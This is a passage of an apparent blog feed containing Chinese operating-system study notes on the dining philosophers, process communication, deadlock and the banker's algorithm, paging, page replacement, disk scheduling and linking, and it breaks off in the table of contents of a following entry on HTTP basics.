class="function"><span class="keyword">void</span> <span class="title">philosopher</span><span class="params">(<span class="keyword">int</span> i)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(TRUE) &#123;</span><br><span class="line">        think();</span><br><span class="line">        take(i);       <span class="comment">// 拿起左边的筷子</span></span><br><span class="line">        take((i+<span class="number">1</span>)%N); <span class="comment">// 拿起右边的筷子</span></span><br><span class="line">        eat();</span><br><span class="line">        put(i);</span><br><span class="line">        put((i+<span class="number">1</span>)%N);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>为了防止死锁的发生，可以设置两个条件：</p><ol><li>必须同时拿起左右两根筷子；</li><li>只有在两个邻居都没有进餐的情况下才允许进餐。</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> N 5</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LEFT (i + N - 1) % N <span class="comment">// 左邻居</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> RIGHT (i + 1) % N    <span class="comment">// 右邻居</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> THINKING 0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HUNGRY   1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> EATING   2</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> semaphore;</span><br><span class="line"><span class="keyword">int</span> state[N];                <span class="comment">// 跟踪每个哲学家的状态</span></span><br><span class="line">semaphore mutex = <span class="number">1</span>;         <span class="comment">// 临界区的互斥</span></span><br><span class="line">semaphore s[N];              <span class="comment">// 每个哲学家一个信号量</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">philosopher</span><span class="params">(<span class="keyword">int</span> i)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(TRUE) &#123;</span><br><span class="line">        think();</span><br><span class="line">        take_two(i);</span><br><span class="line">        eat();</span><br><span class="line">        put_tow(i);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">take_two</span><span class="params">(<span class="keyword">int</span> i)</span> </span>&#123;</span><br><span class="line">    down(&amp;mutex);</span><br><span class="line">    state[i] = HUNGRY;</span><br><span class="line">    test(i);</span><br><span class="line">    up(&amp;mutex);</span><br><span class="line">    down(&amp;s[i]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">put_tow</span><span class="params">(i)</span> </span>&#123;</span><br><span class="line">    down(&amp;mutex);</span><br><span class="line">    state[i] = THINKING;</span><br><span class="line">    test(LEFT);</span><br><span class="line">    test(RIGHT);</span><br><span class="line">    up(&amp;mutex);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">(i)</span> </span>&#123;         <span class="comment">// 尝试拿起两把筷子</span></span><br><span class="line">    <span class="keyword">if</span>(state[i] == HUNGRY &amp;&amp; state[LEFT] != EATING &amp;&amp; state[RIGHT] !=EATING) &#123;</span><br><span class="line">        state[i] = EATING;</span><br><span class="line">        up(&amp;s[i]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="进程通信"><a href="#进程通信" class="headerlink" title="进程通信"></a>进程通信</h2><h3 id="1-进程同步与进程通信的区别"><a href="#1-进程同步与进程通信的区别" class="headerlink" title="1. 进程同步与进程通信的区别"></a>1. 进程同步与进程通信的区别</h3><ul><li>进程同步：控制多个进程按一定顺序执行；</li><li>进程通信：进程间传输信息。</li></ul><p>进程通信是一种手段，而进程同步是一种目的。也可以说，为了能够达到进程同步的目的，需要让进程进行通信，传输一些进程同步所需要的信息。</p><p>在进程同步中介绍的信号量也属于进程通信的一种方式，但是属于低级别的进程通信，因为它传输的信息非常小。</p><h3 id="2-进程通信方式"><a href="#2-进程通信方式" class="headerlink" title="2. 进程通信方式"></a>2. 进程通信方式</h3><h4 id="2-1-消息传递"><a href="#2-1-消息传递" class="headerlink" title="2.1 消息传递"></a>2.1 消息传递</h4><p>操作系统提供了用于通信的通道（Channel），进程可以通过读写这个通道进行通信。</p><p><div align="center"> <img src="/images/posts/037c3a0b-332d-434d-a374-f343ef72c8e1.jpg" width="400"> </div><br></p><p><font size="3">  <strong>（一）管道</strong>  </font><br></p><p>写进程在管道的尾端写入数据，读进程在管道的首端读出数据。管道提供了简单的流控制机制，进程试图读空管道时，在有数据写入管道前，进程将一直阻塞。同样地，管道已经满时，进程再试图写管道，在其它进程从管道中移走数据之前，写进程将一直阻塞。</p><p>Linux 中管道通过空文件实现。</p><p>管道有三种：</p><ol><li>普通管道：有两个限制，一是只能单向传输；二是只能在父子进程之间使用；</li><li>流管道：去除第一个限制，支持双向传输；</li><li>命名管道：去除第二个限制，可以在不相关进程之间进行通信。</li></ol><p><div align="center"> <img src="/images/posts/7f642a65-b167-4c8f-b382-8322c6322b2c.jpg" width="400"> </div><br></p><p><font size="3">  <strong>（二）消息队列</strong>  </font><br></p><p>消息队列克服了信号传递信息少、管道只能承载无格式字节流以及缓冲区大小受限等缺点。</p><p><div align="center"> <img src="/images/posts/d49466db-fdd3-4d36-8a86-47dc45c07a1e.jpg" width="400"> </div><br></p><p><font size="3">  <strong>（三）套接字</strong>  </font><br></p><p>套接字也是一种进程间通信机制，与其它通信机制不同的是，它可用于不同机器间的进程通信。</p><p><div align="center"> <img src="/images/posts/699b4f96-d63f-46ea-a581-2b3d95eceb6a.jpg" width="400"> </div><br></p><h4 id="2-2-共享内存"><a href="#2-2-共享内存" class="headerlink" title="2.2 共享内存"></a>2.2 共享内存</h4><p>操作系统建立一块共享内存，并将其映射到每个进程的地址空间上，进程就可以直接对这块共享内存进行读写。</p><p>共享内存是最快的进程通信方式。</p><p><div align="center"> <img src="/images/posts/7be0abf9-687c-4451-becd-626b0be7ec22.jpg" width="400"> </div><br></p><h1 id="三、死锁"><a href="#三、死锁" class="headerlink" title="三、死锁"></a>三、死锁</h1><h2 id="死锁的必要条件"><a href="#死锁的必要条件" class="headerlink" title="死锁的必要条件"></a>死锁的必要条件</h2><p><div align="center"> <img src="/images/posts/c037c901-7eae-4e31-a1e4-9d41329e5c3e.png"> </div><br></p><ol><li>互斥：每个资源要么已经分配给了一个进程，要么就是可用的。</li><li>占有和等待：已经得到了某个资源的进程可以再请求新的资源。</li><li>不可抢占：已经分配给一个进程的资源不能强制性地被抢占，它只能被占有它的进程显式地释放。</li><li>环路等待：有两个或者两个以上的进程组成一条环路，该环路中的每个进程都在等待下一个进程所占有的资源。</li></ol><h2 id="死锁的处理方法"><a href="#死锁的处理方法" class="headerlink" title="死锁的处理方法"></a>死锁的处理方法</h2><h3 id="1-鸵鸟策略"><a href="#1-鸵鸟策略" class="headerlink" title="1. 鸵鸟策略"></a>1. 鸵鸟策略</h3><p>把头埋在沙子里，假装根本没发生问题。</p><p>因为解决死锁问题的代价很高，因此鸵鸟策略这种不采取任务措施的方案会获得更高的性能。当发生死锁时不会对用户造成多大影响，或发生死锁的概率很低，可以采用鸵鸟策略。</p><p>大多数操作系统，包括 Unix，Linux 和 Windows，处理死锁问题的办法仅仅是忽略它。</p><h3 id="2-死锁检测与死锁恢复"><a href="#2-死锁检测与死锁恢复" class="headerlink" title="2. 死锁检测与死锁恢复"></a>2. 死锁检测与死锁恢复</h3><p>不试图阻止死锁，而是当检测到死锁发生时，采取措施进行恢复。</p><p><strong>（一）每种类型一个资源的死锁检测</strong> </p><p><div align="center"> <img src="/images/posts/b1fa0453-a4b0-4eae-a352-48acca8fff74.png"> </div><br></p><p>上图为资源分配图，其中方框表示资源，圆圈表示进程。资源指向进程表示该资源已经分配给该进程，进程指向资源表示进程请求获取该资源。</p><p>图 a 可以抽取出环，如图 b，它满足了环路等待条件，因此会发生死锁。</p><p>每种类型一个资源的死锁检测算法是通过检测有向图是否存在环来实现，从一个节点出发进行深度优先搜索，对访问过的节点进行标记，如果访问了已经标记的节点，就表示有向图存在环，也就是检测到死锁的发生。</p><p><strong>（二）每种类型多个资源的死锁检测</strong> </p><p><div align="center"> <img src="/images/posts/e1eda3d5-5ec8-4708-8e25-1a04c5e11f48.png"> </div><br></p><p>上图中，有三个进程四个资源，每个数据代表的含义如下：</p><ul><li>E 向量：资源总量</li><li>A 向量：资源剩余量</li><li>C 矩阵：每个进程所拥有的资源数量，每一行都代表一个进程拥有资源的数量</li><li>R 矩阵：每个进程请求的资源数量</li></ul><p>进程 P<sub>1</sub> 和 P<sub>2</sub> 所请求的资源都得不到满足，只有进程 P<sub>3</sub> 可以，让 P<sub>3</sub> 执行，之后释放 P<sub>3</sub> 拥有的资源，此时 A = (2 2 2 0)。P<sub>2</sub> 可以执行，执行后释放 P<sub>2</sub> 拥有的资源，A = (4 2 2 1) 。P<sub>1</sub> 也可以执行。所有进程都可以顺利执行，没有死锁。</p><p>算法总结如下：</p><p>每个进程最开始时都不被标记，执行过程有可能被标记。当算法结束时，任何没有被标记的进程都是死锁进程。</p><ol><li>寻找一个没有标记的进程 P<sub>i</sub>，它所请求的资源小于等于 A。</li><li>如果找到了这样一个进程，那么将 C 矩阵的第 i 行向量加到 A 中，标记该进程，并转回 1。</li><li>如果没有这样一个进程，算法终止。</li></ol><p><strong>（三）死锁恢复</strong> </p><ul><li>利用抢占恢复</li><li>利用回滚恢复</li><li>通过杀死进程恢复</li></ul><h3 id="3-死锁预防"><a href="#3-死锁预防" class="headerlink" title="3. 死锁预防"></a>3. 死锁预防</h3><p>在程序运行之前预防发生死锁。</p><p><strong>（一）破坏互斥条件</strong> </p><p>例如假脱机打印机技术允许若干个进程同时输出，唯一真正请求物理打印机的进程是打印机守护进程。</p><p><strong>（二）破坏占有和等待条件</strong> </p><p>一种实现方式是规定所有进程在开始执行前请求所需要的全部资源。</p><p><strong>（三）破坏不可抢占条件</strong> </p><p><strong>（四）破坏环路等待</strong> </p><p>给资源统一编号，进程只能按编号顺序来请求资源。</p><h3 id="4-死锁避免"><a href="#4-死锁避免" class="headerlink" title="4. 死锁避免"></a>4. 死锁避免</h3><p>在程序运行时避免发生死锁。</p><p><strong>（一）安全状态</strong> </p><p><div align="center"> <img src="/images/posts/ed523051-608f-4c3f-b343-383e2d194470.png"> </div><br></p><p>图 a 的第二列 Has 表示已拥有的资源数，第三列 Max 表示总共需要的资源数，Free 表示还有可以使用的资源数。从图 a 开始出发，先让 B 拥有所需的所有资源（图 b），运行结束后释放 B，此时 Free 变为 5（图 c）；接着以同样的方式运行 C 和 A，使得所有进程都能成功运行，因此可以称图 a 所示的状态时安全的。</p><p>定义：如果没有死锁发生，并且即使所有进程突然请求对资源的最大需求，也仍然存在某种调度次序能够使得每一个进程运行完毕，则称该状态是安全的。</p><p>安全状态的检测与死锁的检测类似，因为安全状态必须要求不能发生死锁。下面的银行家算法与死锁检测算法非常类似，可以结合着做参考对比。</p><p><strong>（二）单个资源的银行家算法</strong> </p><p>一个小城镇的银行家，他向一群客户分别承诺了一定的贷款额度，算法要做的是判断对请求的满足是否会进入不安全状态，如果是，就拒绝请求；否则予以分配。</p><p><div align="center"> <img src="/images/posts/d160ec2e-cfe2-4640-bda7-62f53e58b8c0.png"> </div><br></p><p>上图 c 为不安全状态，因此算法会拒绝之前的请求，从而避免进入图 c 中的状态。</p><p><strong>（三）多个资源的银行家算法</strong> </p><p><div align="center"> <img src="/images/posts/62e0dd4f-44c3-43ee-bb6e-fedb9e068519.png"> </div><br></p><p>上图中有五个进程，四个资源。左边的图表示已经分配的资源，右边的图表示还需要分配的资源。最右边的 E、P 以及 A 分别表示：总资源、已分配资源以及可用资源，注意这三个为向量，而不是具体数值，例如 A=(1020)，表示 4 个资源分别还剩下 1/0/2/0。</p><p>检查一个状态是否安全的算法如下：</p><ul><li>查找右边的矩阵是否存在一行小于等于向量 A。如果不存在这样的行，那么系统将会发生死锁，状态是不安全的。</li><li>假若找到这样一行，将该进程标记为终止，并将其已分配资源加到 A 中。</li><li>重复以上两步，直到所有进程都标记为终止，则状态时安全的。</li></ul><p>如果一个状态不是安全的，也需要拒绝进入这个状态。</p><h1 id="四、内存管理"><a href="#四、内存管理" class="headerlink" title="四、内存管理"></a>四、内存管理</h1><h2 id="虚拟内存"><a href="#虚拟内存" class="headerlink" title="虚拟内存"></a>虚拟内存</h2><p>每个程序拥有自己的地址空间，这个地址空间被分割成多个块，每一块称为一页。这些页被映射到物理内存，但不需要映射到连续的物理内存，也不需要所有页都必须在物理内存中。当程序引用到一部分不在物理内存中的地址空间时，由硬件执行必要的映射，将缺失的部分装入物理内存并重新执行失败的指令。</p><h2 id="分页与分段"><a href="#分页与分段" class="headerlink" title="分页与分段"></a>分页与分段</h2><h3 id="1-分页"><a href="#1-分页" class="headerlink" title="1. 分页"></a>1. 分页</h3><p>大部分虚拟内存系统都使用分页技术。把由程序产生的地址称为虚拟地址，它们构成了一个虚拟地址空间。例如有一台计算机可以产生 16 位地址，它的虚拟地址空间为 0~64K，然而计算机只有 32KB 的物理内存，因此虽然可以编写 64KB 的程序，但它们不能被完全调入内存运行。</p><p><div align="center"> <img src="/images/posts/7b281b1e-0595-402b-ae35-8c91084c33c1.png"> </div><br></p><p>虚拟地址空间划分成固定大小的页，在物理内存中对应的单元称为页框，页和页框大小通常相同，它们之间通过页表进行映射。</p><p>程序最开始只将一部分页调入页框中，当程序引用到没有在页框的页时，产生缺页中断，进行页面置换，按一定的原则将一部分页框换出，并将页调入。</p><h3 id="2-分段"><a href="#2-分段" class="headerlink" title="2. 分段"></a>2. 分段</h3><p><div align="center"> <img src="/images/posts/22de0538-7c6e-4365-bd3b-8ce3c5900216.png"> </div><br></p><p>上图为一个编译器在编译过程中建立的多个表，有 4 个表是动态增长的，如果使用分页系统的一维地址空间，动态增长的特点会导致覆盖问题的出现。</p><p><div align="center"> <img src="/images/posts/e0900bb2-220a-43b7-9aa9-1d5cd55ff56e.png"> </div><br></p><p>分段的做法是把每个表分成段，一个段构成一个独立的地址空间。每个段的长度可以不同，并且可以动态增长。</p><p>每个段都需要程序员来划分。</p><h3 id="3-段页式"><a href="#3-段页式" class="headerlink" title="3. 段页式"></a>3. 段页式</h3><p>用分段方法来分配和管理虚拟存储器。程序的地址空间按逻辑单位分成基本独立的段，而每一段有自己的段名，再把每段分成固定大小的若干页。</p><p>用分页方法来分配和管理实存。即把整个主存分成与上述页大小相等的存储块，可装入作业的任何一页。</p><p>程序对内存的调入或调出是按页进行的，但它又可按段实现共享和保护。</p><h3 id="4-分页与分段区别"><a href="#4-分页与分段区别" class="headerlink" title="4. 分页与分段区别"></a>4. 分页与分段区别</h3><ul><li><p>对程序员的透明性：分页透明，但是分段需要程序员显示划分每个段。</p></li><li><p>地址空间的维度：分页是一维地址空间，分段是二维的。</p></li><li><p>大小是否可以改变：页的大小不可变，段的大小可以动态改变。</p></li><li><p>出现的原因：分页主要用于实现虚拟内存，从而获得更大的地址空间；分段主要是为了使程序和数据可以被划分为逻辑上独立的地址空间并且有助于共享和保护。</p></li></ul><h2 id="分页系统地址映射"><a href="#分页系统地址映射" class="headerlink" title="分页系统地址映射"></a>分页系统地址映射</h2><ul><li>内存管理单元（MMU）：管理着虚拟地址空间和物理内存的转换。</li><li>页表（Page table）：页（虚拟地址空间）和页框（物理内存空间）的映射表。例如下图中，页表的第 0 个表项为 010，表示第 0 个页映射到第 2 个页框。页表项的最后一位用来标记页是否在内存中。</li></ul><p>下图的页表存放着 16 个页，这 16 个页需要用 4 个比特位来进行索引定位。因此对于虚拟地址（0010 000000000100），前 4 位是用来存储页面号，而后 12 位存储在页中的偏移量。</p><p>（0010 000000000100）根据前 4 位得到页号为 2，读取表项内容为（110 1），它的前 3 为为页框号，最后 1 位表示该页在内存中。最后映射得到物理内存地址为（110 000000000100）。</p><p><div align="center"> <img src="/images/posts/cf4386a1-58c9-4eca-a17f-e12b1e9770eb.png" width="500"> </div><br></p><h2 id="页面置换算法"><a href="#页面置换算法" class="headerlink" title="页面置换算法"></a>页面置换算法</h2><p>在程序运行过程中，如果要访问的页面不在内存中，就发生缺页中断从而将该页调入内存中。此时如果内存已无空闲空间，系统必须从内存中调出一个页面到磁盘对换区中来腾出空间。</p><p>页面置换算法的主要目标是使页面置换频率最低（也可以说缺页率最低）。</p><h3 id="1-最佳"><a href="#1-最佳" class="headerlink" title="1. 最佳"></a>1. 最佳</h3><blockquote><p>Optimal</p></blockquote><p>所选择的被换出的页面将是最长时间内不再被访问，通常可以保证获得最低的缺页率。</p><p>是一种理论上的算法，因为无法知道一个页面多长时间不再被访问。</p><p>举例：一个系统为某进程分配了三个物理块，并有如下页面引用序列：</p><p><div align="center"><img src="https://latex.codecogs.com/gif.latex?7，0，1，2，0，3，0，4，2，3，0，3，2，1，2，0，1，7，0，1"></div> <br></p><p>开始运行时，先将 7, 0, 1 三个页面装入内存。当进程要访问页面 2 时，产生缺页中断，会将页面 7 换出，因为页面 7 再次被访问的时间最长。</p><h3 id="2-先进先出"><a href="#2-先进先出" class="headerlink" title="2. 先进先出"></a>2. 先进先出</h3><blockquote><p>FIFO, First In First Out</p></blockquote><p>所选择换出的页面是最先进入的页面。</p><p>该算法会将那些经常被访问的页面也被换出，从而使缺页率升高。</p><h3 id="3-最近最久未使用"><a href="#3-最近最久未使用" class="headerlink" title="3. 最近最久未使用"></a>3. 最近最久未使用</h3><blockquote><p>LRU, Least Recently Used</p></blockquote><p>虽然无法知道将来要使用的页面情况，但是可以知道过去使用页面的情况。LRU 将最近最久未使用的页面换出。</p><p>可以用栈来实现该算法，栈中存储页面的页面号。当进程访问一个页面时，将该页面的页面号从栈移除，并将它压入栈顶。这样，最近被访问的页面总是在栈顶，而最近最久未使用的页面总是在栈底。</p><p><div align="center"><img src="https://latex.codecogs.com/gif.latex?4，7，0，7，1，0，1，2，1，2，6"></div> <br></p><p><div align="center"> <img src="/images/posts/eb859228-c0f2-4bce-910d-d9f76929352b.png"> </div><br></p><h3 id="4-时钟"><a href="#4-时钟" class="headerlink" title="4. 时钟"></a>4. 时钟</h3><blockquote><p>Clock</p></blockquote><p>需要用到一个访问位，当一个页面被访问时，将访问位置为 1。</p><p>首先，将内存中的所有页面链接成一个循环队列，当缺页中断发生时，检查当前指针所指向页面的访问位，如果访问位为 0，就将该页面换出；否则将该页的访问位设置为 0，给该页面第二次的机会，移动指针继续检查。</p><p><div align="center"> <img src="/images/posts/5f5ef0b6-98ea-497c-a007-f6c55288eab1.png"> </div><br></p><h1 id="五、设备管理"><a href="#五、设备管理" class="headerlink" title="五、设备管理"></a>五、设备管理</h1><h2 id="磁盘调度算法"><a href="#磁盘调度算法" class="headerlink" title="磁盘调度算法"></a>磁盘调度算法</h2><p>当多个进程同时请求访问磁盘时，需要进行磁盘调度来控制对磁盘的访问。</p><p>磁盘调度的主要目标是使磁盘的平均寻道时间最少。</p><h3 id="1-先来先服务"><a href="#1-先来先服务" class="headerlink" title="1. 先来先服务"></a>1. 先来先服务</h3><blockquote><p>FCFS, First Come First Served</p></blockquote><p>根据进程请求访问磁盘的先后次序来进行调度。优点是公平和简单，缺点也很明显，因为未对寻道做任何优化，使平均寻道时间可能较长。</p><h3 id="2-最短寻道时间优先"><a href="#2-最短寻道时间优先" class="headerlink" title="2. 最短寻道时间优先"></a>2. 最短寻道时间优先</h3><blockquote><p>SSTF, Shortest Seek Time First</p></blockquote><p>要求访问的磁道与当前磁头所在磁道距离最近的优先进行调度。这种算法并不能保证平均寻道时间最短，但是比 FCFS 好很多。</p><h3 id="3-扫描算法"><a href="#3-扫描算法" class="headerlink" title="3. 扫描算法"></a>3. 扫描算法</h3><blockquote><p>SCAN</p></blockquote><p>SSTF 会出现饥饿现象。考虑以下情况，新进程请求访问的磁道与磁头所在磁道的距离总是比一个在等待的进程来的近，那么等待的进程会一直等待下去。</p><p>SCAN 算法在 SSTF 算法之上考虑了磁头的移动方向，要求所请求访问的磁道在磁头当前移动方向上才能够得到调度。因为考虑了移动方向，那么一个进程请求访问的磁道一定会得到调度。</p><p>当一个磁头自里向外移动时，移到最外侧会改变移动方向为自外向里，这种移动的规律类似于电梯的运行，因此又常称 SCAN 算法为电梯调度算法。</p><h3 id="4-循环扫描算法"><a href="#4-循环扫描算法" class="headerlink" title="4. 循环扫描算法"></a>4. 循环扫描算法</h3><blockquote><p>CSCAN</p></blockquote><p>CSCAN 对 SCAN 进行了改动，要求磁头始终沿着一个方向移动。</p><h1 id="六、链接"><a href="#六、链接" class="headerlink" title="六、链接"></a>六、链接</h1><h2 id="编译系统"><a href="#编译系统" class="headerlink" title="编译系统"></a>编译系统</h2><p>以下是一个 hello.c 程序：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"hello, world\n"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在 Unix 系统上，由编译器把源文件转换为目标文件。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -o hello hello.c</span><br></pre></td></tr></table></figure><p>这个过程大致如下：</p><p><div align="center"> <img src="/images/posts/b396d726-b75f-4a32-89a2-03a7b6e19f6f.jpg" width="800"> </div><br></p><ol><li>预处理阶段：处理以 # 开头的预处理命令；</li><li>编译阶段：翻译成汇编程序；</li><li>汇编阶段：将汇编程序翻译可重定向目标程序，它是二进制的；</li><li>链接阶段：将可重定向目标程序和 printf.o 等单独预编译好的目标文件进行合并，得到最终的可执行目标程序。</li></ol><h2 id="目标文件"><a href="#目标文件" class="headerlink" title="目标文件"></a>目标文件</h2><ol><li>可执行目标文件：可以直接在内存中执行；</li><li>可重定向目标文件：可与其他可重定向目标文件在链接阶段合并，创建一个可执行目标文件；</li><li>共享目标文件：可以在运行时被动态加载进内存并链接；</li></ol><h2 id="静态链接"><a href="#静态链接" class="headerlink" title="静态链接"></a>静态链接</h2><p>静态连接器以一组可重定向目标文件为输入，生成一个完全链接的可执行目标文件作为输出。链接器主要完成以下两个任务：</p><ol><li>符号解析：每个符号对应于一个函数、一个全局变量或一个静态变量，符号解析的目的是将每个符号引用与一个符号定义关联起来。</li><li>重定位：编译器和汇编器生成从地址 0 开始的代码和数据节，链接器通过把每个符号定义与一个内存位置关联起来，从而重定位这些节，然后修改所有对这些符号的引用，使得它们指向这个内存位置。</li></ol><p><div align="center"> <img src="/images/posts/47d98583-8bb0-45cc-812d-47eefa0a4a40.jpg"> </div><br></p><h2 id="动态链接"><a href="#动态链接" class="headerlink" title="动态链接"></a>动态链接</h2><p>静态库有以下两个问题：</p><ul><li>当静态库更新时那么整个程序都要重新进行链接；</li><li>对于 printf 这种标准函数库，如果每个程序都要有代码，这会极大浪费资源。</li></ul><p>共享库是为了解决静态库的这两个问题而设计的，在 Linux 系统中通常用 .so 后缀来表示，Windows 系统上它们被称为 DLL。它具有以下特点：</p><ol><li>在给定的文件系统中一个库只有一个 .so 文件，所有引用该库的可执行目标文件都共享这个文件，它不会被复制到引用它的可执行文件中；</li><li>在内存中，一个共享库的 .text 节的一个副本可以被不同的正在运行的进程共享。</li></ol><p><div align="center"> <img src="/images/posts/76dc7769-1aac-4888-9bea-064f1caa8e77.jpg"> </div><br></p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul><li>Tanenbaum A S, Bos H. Modern operating systems[M]. Prentice Hall Press, 2014.</li><li>汤子瀛, 哲凤屏, 汤小丹. 计算机操作系统[M]. 西安电子科技大学出版社, 2001.</li><li>Bryant, R. E., &amp; O’Hallaron, D. R. (2004). 深入理解计算机系统.</li><li><a href="https://applied-programming.github.io/Operating-Systems-Notes/" target="_blank" rel="noopener">Operating System Notes</a></li><li><a href="http://blog.csdn.net/yufaw/article/details/7409596" target="_blank" rel="noopener">进程间的几种通信方式</a></li><li><a href="https://www.cs.uic.edu/\~jbell/CourseNotes/OperatingSystems/2_Structures.html" target="_blank" rel="noopener">Operating-System Structures</a></li><li><a href="http://cse.csusb.edu/tongyu/courses/cs460/notes/process.php" target="_blank" rel="noopener">Processes</a></li><li><a href="https://www.slideshare.net/rkolahalam/inter-process-communication-presentation1" target="_blank" rel="noopener">Inter Process Communication Presentation[1]</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;!-- GFM-TOC --&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#一概述&quot;&gt;一、概述&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#操作系统基本特征&quot;&gt;操作系统基本特征&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#操作系统基本功能&quot;&gt;操作系统基本功能&lt;/a&gt;&lt;/li&gt;
&lt;l
      
    
    </summary>
    
      <category term="系统运维" scheme="https://linux7788.com/categories/%E7%B3%BB%E7%BB%9F%E8%BF%90%E7%BB%B4/"/>
    
    
      <category term="ops" scheme="https://linux7788.com/tags/ops/"/>
    
  </entry>
  
  <entry>
    <title>HTTP协议基础知识</title>
    <link href="https://linux7788.com/linux_ops/http/"/>
    <id>https://linux7788.com/linux_ops/http/</id>
    <published>2018-05-18T11:38:25.000Z</published>
    <updated>2018-05-19T14:16:00.299Z</updated>
    
    <content type="html"><![CDATA[<!-- GFM-TOC --><ul><li><a href="#一-基础概念">一 、基础概念</a><ul><li><a href="#web-基础">Web 基础</a></li><li><a href="#url">URL</a></li><li><a href="#请求和响应报文">请求和响应报文</a></li></ul></li><li><a href="#二http-方法">二、HTTP 方法</a><ul><li><a href="#get">GET</a></li><li><a href="#head">HEAD</a></li><li><a href="#post">POST</a></li><li><a href="#put">PUT</a></li><li><a href="#patch">PATCH</a></li><li><a href="#delete">DELETE</a></li><li><a href="#options">OPTIONS</a></li><li><a href="#connect">CONNECT</a></li><li><a href="#trace">TRACE</a></li></ul></li><li><a href="#三http-状态码">三、HTTP 状态码</a><ul><li><a href="#1xx-信息">1XX 信息</a></li><li><a href="#2xx-成功">2XX 成功</a></li><li><a href="#3xx-重定向">3XX 重定向</a></li><li><a href="#4xx-客户端错误">4XX 客户端错误</a></li><li><a href="#5xx-服务器错误">5XX 服务器错误</a></li></ul></li><li><a href="#四http-首部">四、HTTP 首部</a><ul><li><a href="#通用首部字段">通用首部字段</a></li><li><a href="#请求首部字段">请求首部字段</a></li><li><a href="#响应首部字段">响应首部字段</a></li><li><a href="#实体首部字段">实体首部字段</a></li></ul></li><li><a href="#五具体应用">五、具体应用</a><ul><li><a href="#cookie">Cookie</a></li><li><a href="#缓存">缓存</a></li><li><a href="#连接管理">连接管理</a></li><li><a href="#内容协商">内容协商</a></li><li><a href="#内容编码">内容编码</a></li><li><a href="#范围请求">范围请求</a></li><li><a href="#分块传输编码">分块传输编码</a></li><li><a href="#多部分对象集合">多部分对象集合</a></li><li><a href="#虚拟主机">虚拟主机</a></li><li><a href="#通信数据转发">通信数据转发</a></li></ul></li><li><a href="#六https">六、HTTPs</a><ul><li><a href="#加密">加密</a></li><li><a href="#认证">认证</a></li><li><a href="#完整性保护">完整性保护</a></li><li><a href="#https-的缺点">HTTPs 的缺点</a></li><li><a href="#配置-https">配置 HTTPs</a></li></ul></li><li><a href="#七web-攻击技术">七、Web 攻击技术</a><ul><li><a href="#跨站脚本攻击">跨站脚本攻击</a></li><li><a href="#跨站点请求伪造">跨站点请求伪造</a></li><li><a href="#sql-注入攻击">SQL 注入攻击</a></li><li><a href="#拒绝服务攻击">拒绝服务攻击</a></li></ul></li><li><a href="#八get-和-post-的区别">八、GET 和 POST 的区别</a><ul><li><a href="#作用">作用</a></li><li><a href="#参数">参数</a></li><li><a href="#安全">安全</a></li><li><a href="#幂等性">幂等性</a></li><li><a href="#可缓存">可缓存</a></li><li><a href="#xmlhttprequest">XMLHttpRequest</a></li></ul></li><li><a href="#九http10-与-http11-的区别">九、HTTP/1.0 与 HTTP/1.1 的区别</a></li><li><a href="#十http20">十、HTTP/2.0</a><ul><li><a href="#http1x-缺陷">HTTP/1.x 缺陷</a></li><li><a href="#二进制分帧层">二进制分帧层</a></li><li><a href="#服务端推送">服务端推送</a></li><li><a 